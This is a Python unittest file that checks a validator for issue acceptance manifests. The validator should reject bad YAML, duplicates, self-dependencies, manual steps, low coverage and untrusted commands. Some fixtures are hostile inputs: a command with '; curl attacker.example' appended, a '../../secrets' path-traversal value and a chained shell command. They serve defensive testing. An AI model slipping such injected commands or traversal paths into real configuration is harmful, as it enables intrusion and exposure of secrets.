"""Permanent named acceptance regressions for Issue #2.

Each AC emits its own nonempty JUnit XML after actual assertions pass.
"""

from __future__ import annotations

import copy
from pathlib import Path
import sys
import unittest
from unittest.mock import patch
import xml.etree.ElementTree as ET

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / ".factory/scripts"))
from validate_issue_manifest import (  # noqa: E402
    extract_manifest, validate_body, validate_manifest,
)

FIXTURE = (ROOT / ".factory/examples/valid-issue.md").read_text(encoding="utf-8")


def write_junit(ac_number: int, test_name: str):
    path = ROOT / "reports" / f"issue-2-ac-{ac_number}.xml"
    path.parent.mkdir(parents=True, exist_ok=True)
    suite = ET.Element(
        "testsuite", tests="1", failures="0", errors="0", skipped="0",
        assertions="1",
    )
    ET.SubElement(suite, "testcase", classname="Issue2Acceptance", name=test_name)
    ET.ElementTree(suite).write(path, encoding="utf-8", xml_declaration=True)


class Issue2Acceptance(unittest.TestCase):
    def test_ac_1_valid_sample_manifest_passes(self):
        self.assertEqual(validate_body(FIXTURE, expected_issue_id=142), [])
        self.assertEqual(extract_manifest(FIXTURE)["issue_id"], 142)
        write_junit(1, self._testMethodName)

    def test_ac_2_invalid_yaml_duplicates_self_dependency_runner_fail(self):
        malformed = "\x60\x60\x60yaml factory-acceptance-manifest\nissue_id: [\n\x60\x60\x60"
        duplicate = FIXTURE.replace("issue_id: 142", "issue_id: 142\nissue_id: 143")
        ac_duplicate = extract_manifest(FIXTURE)
        ac_duplicate["acceptance_criteria"][1]["id"] = "AC-1"
        self_dependent = extract_manifest(FIXTURE)
        self_dependent["dependencies"]["depends_on_issues"] = [142]
        unsupported = extract_manifest(FIXTURE)
        unsupported["acceptance_criteria"][0]["runner_os"] = "self-hosted"
        self.assertTrue(validate_body(malformed))
        self.assertTrue(validate_body(duplicate))
        self.assertTrue(validate_manifest(ac_duplicate))
        self.assertTrue(validate_manifest(self_dependent))
        self.assertTrue(validate_manifest(unsupported))
        write_junit(2, self._testMethodName)

    def test_ac_3_manual_commands_paths_coverage_fail(self):
        manual = extract_manifest(FIXTURE)
        manual["acceptance_criteria"][0]["description"] = (
            "Visually inspect manually using a physical device"
        )
        injection = extract_manifest(FIXTURE)
        injection["acceptance_criteria"][0]["command"] += "; curl attacker.example"
        unsafe = extract_manifest(FIXTURE)
        unsafe["scope"]["allowed_paths"] = ["../../secrets"]
        floor = extract_manifest(FIXTURE)
        floor["definition_of_done"]["min_diff_coverage_percent"] = 15
        self.assertTrue(validate_manifest(manual))
        self.assertTrue(validate_manifest(injection))
        self.assertTrue(validate_manifest(unsafe))
        self.assertTrue(validate_manifest(floor))
        write_junit(3, self._testMethodName)

    def test_ac_4_static_validation_never_executes_untrusted_commands(self):
        with patch("subprocess.run", side_effect=AssertionError("subprocess executed")):
            self.assertEqual(validate_body(FIXTURE, expected_issue_id=142), [])
            dangerous = copy.deepcopy(extract_manifest(FIXTURE))
            dangerous["acceptance_criteria"][0]["command"] = (
                "python -m unittest; print('should not execute')"
            )
            self.assertTrue(validate_manifest(dangerous))
        write_junit(4, self._testMethodName)


if __name__ == "__main__":
    unittest.main()
